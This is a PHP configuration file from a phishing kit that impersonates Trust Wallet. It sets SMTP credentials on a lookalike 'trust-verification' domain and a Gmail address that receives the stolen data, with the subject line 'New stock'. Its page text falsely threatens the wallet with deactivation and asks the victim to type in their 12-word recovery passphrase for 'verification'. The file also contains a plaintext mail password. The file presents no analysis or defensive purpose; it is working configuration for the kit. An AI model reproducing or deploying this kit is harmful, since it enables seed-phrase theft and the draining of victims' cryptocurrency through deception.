<?php
	$project_url = 'https://www.trustwallet.com/';

	$smtp_user = 'trustwallet@trust-verification.com';
	$smtp_pass = 'Basketbal123?!';
	$smtp_host = 'mail.trust-verification.com';
	$smtp_port = 465;
	$smtp_ssl  = true;

	$email_from = 'trustwallet@trust-verification.com';
	$email_to = 'skipskipper306@gmail.com';
	$email_subject = 'New stock';


	$big_title = 'Wallet verification';


	$content_top = '
		<p>To verify your wallet enter the 12 passphrase words from your Trust wallet in the right order, after doing this correctly your wallet will be completely verified and the scheduled deactivation will be removed automatically right after.</p>
	';

	$content_bottom = '';

	$action_title = 'Enter your passphrase';
	$action_subtitle = 'Make sure no one is watching you right now, never share your passphrase with other people.';
	$text_input = 'Use spacebar to separate the words';
	$text_button = 'Verify wallet';


	$finished_action_title = 'You successfully verified your wallet';
	$finished_text = '<p>The verification was successful, our team will review your submission and get back to you by email within 24 hours!';


?>